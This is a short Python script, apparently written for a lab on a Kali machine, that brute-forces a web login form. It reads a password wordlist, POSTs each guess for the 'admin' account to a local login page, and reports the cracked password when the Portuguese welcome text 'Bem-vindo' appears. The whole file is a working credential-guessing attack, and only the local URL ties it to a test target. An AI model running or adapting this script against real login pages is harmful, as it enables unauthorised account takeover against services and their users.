import requests

url = 'http://0.0.0.0:8000/login'
usernames = ['admin']
passwords = open('/home/kali/Downloads/passwords.txt', 'r').readlines()

for username in usernames:
    for line in passwords:
        password = line.strip()
        response = requests.post(url, data={'username': username, 'password': password, 'submit': 'Login'})
        if "Bem-vindo" in response.text:
            print(f"=========[+] PASSWORD CRACKED: {password} =========")
            break
        else:
            print(f"[-] Password invalid: {password}")

    if "Bem-vindo" in response.text:
        break

